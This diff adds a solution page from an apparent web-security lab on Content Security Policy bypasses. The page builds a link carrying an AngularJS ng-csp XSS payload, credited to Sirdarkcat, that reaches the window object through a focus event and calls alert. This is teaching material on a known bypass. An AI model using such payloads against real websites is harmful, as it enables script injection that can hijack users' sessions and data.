@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <title>Vulnerable CSP Examples</title>
+</head>
+
+<body>
+    <div class="container">
+        <div class="p-3 mb-2 bg-secondary text-white">
+            <h1>Solution 2</h1>
+            <div class="p-3 mb-2 bg-light text-dark">
+                The application is hosting a version of AngularJS which is trusted through a nonce based csp.
+                Use the following payload from Sirdarkcat:</br>
+                Open the <div id="solutionjs"></div> and click 'foo'
+
+                <script>
+                    var div = document.getElementById('solutionjs')
+                    var a = document.createElement('a')
+                    a.href = window.location.origin + '/challenge2?payload=<body ng-app></body> <div ng-app ng-csp> <div ng-focus="x=$event;" id=f tabindex=0>foo</div> <div ng-repeat="(key, value) in x.view"> <div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1337); }}</div> </div> </div> </body>'
+                    a.innerText = 'payload'
+                    div.appendChild(a)
+                </script>
+
+            </div>
+            <a class="btn btn-light" href="/">
+                Back
+            </a>
+        </div>
+
+        <script src="/javascripts/foo.js"></script>
+
+        <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
+            integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+            crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
+            integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
+            crossorigin="anonymous"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
+            integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
+            crossorigin="anonymous"></script>
+</body>
+
+</html>
